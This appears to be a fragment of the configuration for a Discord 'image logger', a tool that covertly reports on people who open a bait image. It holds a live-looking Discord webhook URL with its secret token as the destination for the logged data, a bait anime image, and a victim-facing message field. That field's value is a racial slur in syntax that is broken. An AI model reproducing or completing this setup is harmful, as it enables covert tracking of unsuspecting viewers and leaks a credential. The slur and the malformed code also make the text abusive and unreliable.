...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1418086608137093202/TCHte3R0mYiEcH-HQf4CrLtRR5YY1H59en7rP2kX6lA1FpG3Os7JS18oDDPg7a3zL-Ic",
    "image": "https://wallpapers.com/images/thumbnail/cool-anime-boy-pfp-osamu-dazai-qfzjabg10aq6pak9.webp", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Cooker", # Set this to the name you want the webhook to have
    ...
    "message": Nigga { # Show a custom message when the user opens the image
